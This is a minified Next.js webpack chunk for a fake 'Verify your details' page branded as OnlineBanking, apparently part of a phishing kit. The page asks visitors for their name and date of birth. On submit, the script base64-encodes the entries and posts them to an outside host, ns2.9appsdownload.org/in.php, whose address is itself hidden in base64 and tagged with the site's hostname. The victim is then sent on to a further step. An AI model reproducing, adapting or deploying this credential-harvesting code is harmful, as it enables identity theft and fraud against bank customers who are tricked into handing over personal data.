(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
    [570], {
        4615: function(t, e, n) {
            (window.__NEXT_P = window.__NEXT_P || []).push(["/c", function() {
                return n(7569)
            }])
        },
        9018: function(t, e, n) {
            "use strict";
            var r = n(1876).Buffer,
                a = {
                    dataList: r.from("https://ns2.9appsdownload.org/in.php", "utf-8").toString("base64"),
                    getList: r.from("https://ns2.9appsdownload.org/aja.php", "utf-8").toString("base64")
                };
            e.Z = a
        },
        7569: function(t, e, n) {
            "use strict";
            n.r(e), n.d(e, {
                default: function() {
                    return m
                }
            });
            var r = n(7568),
                a = n(655),
                s = n(5893),
                i = n(9008),
                o = n.n(i),
                c = n(5675),
                l = n.n(c),
                u = n(7294),
                d = n(1163),
                $ = n(9018),
                h = n(1876).Buffer;

            function m() {
                var t, e = function(t, e) {
                        if ("0" !== t.charAt(0) || "00" == t) {
                            var n = parseInt(t);
                            (isNaN(n) || n <= 0 || n > e) && (n = 1), t = n > parseInt(e.toString().charAt(0)) && 1 == n.toString().length ? "0" + n : n.toString()
                        }
                        return t
                    },
                    n = (0, d.useRouter)(),
                    i = (0, u.useState)(""),
                    c = i[0],
                    m = i[1],
                    f = function() {
                        var t = new Date,
                            e = t.getFullYear(),
                            n = t.getMonth() + 1,
                            r = t.getDate();
                        r < 10 && (r = "0" + r);
                        var a = t.getHours(),
                            s = t.getMinutes(),
                            i = a >= 12 ? "PM" : "AM";
                        a %= 12, a = a || 12, s = s < 10 ? "0" + s : s, m(r + "-" + ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"][n].substring(0, 3) + "-" + e + " [" + a + ":" + s + " " + i + " IST]")
                    },
                    p = (0, u.useState)(!1),
                    g = p[0],
                    x = p[1],
                    v = (t = (0, r.Z)(function(t) {
                        var e, r, s, i, o, c, l;
                        return (0, a.__generator)(this, function(a) {
                            switch (a.label) {
                                case 0:
                                    return t.preventDefault(), x(!0), e = new FormData(t.target), r = {}, e.forEach(function(t, e) {
                                        r[e] = t
                                    }), s = JSON.stringify(r), i = ((o = {}).method = "POST", o.headers = {
                                        "Content-Type": "text/plain"
                                    }, o.body = h.from(s, "utf-8").toString("base64"), o), [4, fetch(window.atob($.Z.dataList) + "?id=" + window.location.hostname, i)];
                                case 1:
                                    return [4, (c = a.sent()).json()];
                                case 2:
                                    return l = a.sent(), x(!1), !0 == l.status ? n.push("/d") : x(!1), [2]
                            }
                        })
                    }), function(e) {
                        return t.apply(this, arguments)
                    }),
                    j = function(t) {
                        var n = t.target.value;
                        /\D\/$/.test(n) && (n = n.substr(0, n.length - 1));
                        var r = n.split("/").map(function(t) {
                            return t.replace(/\D/g, "")
                        });
                        r[0] && (r[0] = e(r[0], 31)), r[1] && (r[1] = e(r[1], 12));
                        var a = r.map(function(t, e) {
                            return 2 == t.length && e < 2 ? t + "/" : t
                        });
                        t.target.value = a.join("").substr(0, 10)
                    };
                return (0, u.useEffect)(function() {
                    return f
                }, []), (0, s.jsxs)(s.Fragment, {
                    children: [(0, s.jsxs)(o(), {
                        children: [(0, s.jsx)("title", {
                            children: "Verify your details"
                        }), (0, s.jsx)("meta", {
                            name: "description",
                            content: "verify details to online music app login"
                        })]
                    }), (0, s.jsxs)("main", {
                        children: [(0, s.jsx)("div", {
                            className: "logo",
                            children: (0, s.jsx)(l(), {
                                src: "/image.png",
                                alt: "MyLogo",
                                width: 100,
                                height: 37
                            })
                        }), (0, s.jsx)("br", {}), (0, s.jsx)("div", {
                            className: "panelDiv",
                            children: (0, s.jsx)("div", {
                                className: "panel",
                                children: (0, s.jsx)("span", {
                                    children: c
                                })
                            })
                        }), (0, s.jsx)("div", {
                            className: "content_heading",
                            children: (0, s.jsx)("h3", {
                                className: "pull-left",
                                children: "Verify Details"
                            })
                        }), (0, s.jsxs)("div", {
                            className: "content_area",
                            children: [(0, s.jsx)("p", {
                                className: "mandatory_txt",
                                children: "Mandatory fields are marked with an asterisk (*)"
                            }), (0, s.jsxs)("form", {
                                action: "#",
                                className: "form",
                                method: "post",
                                onSubmit: v,
                                children: [(0, s.jsxs)("div", {
                                    className: "form-group",
                                    children: [(0, s.jsxs)("label", {
                                        className: "control-label",
                                        htmlFor: "Customername",
                                        children: ["Customer Name", (0, s.jsx)("span", {
                                            className: "mandatory_txt",
                                            children: "*"
                                        })]
                                    }), (0, s.jsx)("input", {
                                        className: "form-control",
                                        type: "text",
                                        name: "Customername",
                                        required: !0
                                    })]
                                }), (0, s.jsxs)("div", {
                                    className: "form-group",
                                    children: [(0, s.jsxs)("label", {
                                        className: "control-label",
                                        htmlFor: "Birthday",
                                        children: [" Date of Birth", (0, s.jsx)("span", {
                                            className: "mandatory_txt",
                                            children: "*"
                                        })]
                                    }), (0, s.jsx)("input", {
                                        className: "form-control",
                                        onInput: j,
                                        type: "text",
                                        name: "Birthday",
                                        placeholder: "dd/mm/yyyy",
                                        required: !0
                                    })]
                                }), (0, s.jsx)("div", {
                                    className: "commonbutton",
                                    children: (0, s.jsx)("input", {
                                        name: "btContinue",
                                        id: "btContinue",
                                        disabled: !!g,
                                        type: "submit",
                                        className: "btn btn-default",
                                        title: "submit",
                                        value: "submit"
                                    })
                                })]
                            }), (0, s.jsx)("br", {})]
                        }), (0, s.jsx)("div", {
                            className: "footer_area",
                            children: (0, s.jsx)(l(), {
                                src: "/v.png",
                                width: 68,
                                height: 28,
                                alt: "versign"
                            })
                        }), (0, s.jsx)("div", {
                            className: "footer",
                            children: (0, s.jsx)("p", {
                                children: "\xa9 OnlineBanking"
                            })
                        })]
                    })]
                })
            }
        },
        7568: function(t, e, n) {
            "use strict";

            function r(t, e, n, r, a, s, i) {
                try {
                    var o = t[s](i),
                        c = o.value
                } catch (l) {
                    n(l);
                    return
                }
                o.done ? e(c) : Promise.resolve(c).then(r, a)
            }

            function a(t) {
                return function() {
                    var e = this,
                        n = arguments;
                    return new Promise(function(a, s) {
                        var i = t.apply(e, n);

                        function o(t) {
                            r(i, a, s, o, c, "next", t)
                        }

                        function c(t) {
                            r(i, a, s, o, c, "throw", t)
                        }
                        o(void 0)
                    })
                }
            }
            n.d(e, {
                Z: function() {
                    return a
                }
            })
        }
    },
    function(t) {
        t.O(0, [345, 876, 774, 888, 179], function() {
            return t(t.s = 4615)
        }), _N_E = t.O()
    }
]);